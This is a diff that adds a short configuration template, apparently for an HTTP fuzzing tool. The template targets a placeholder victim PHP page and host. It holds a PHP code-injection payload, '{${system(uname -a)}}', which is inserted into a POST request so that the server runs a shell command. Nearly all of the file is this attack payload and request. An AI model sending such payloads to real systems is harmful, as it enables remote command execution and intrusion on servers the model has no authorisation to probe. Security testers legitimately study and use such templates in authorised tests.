@@ -1,0 +1,22 @@
+
+$VICTIM_PHP_PAGE=
+$VICTIM_HOST=
+
+$uname=<b>{${system(uname -a)}}</b>
+
+literal=uname
+
+reqwait=200
+
+endcfg
+POST VICTIM_PHP_PAGE HTTP/1.1
+Hostname: VICTIM_HOST
+Pragma: no-cache
+Accept: */*
+Content-Type: ''
+Connection: Keep-Alive
+Content-Length: %uname
+
+FUZZ
+
+--
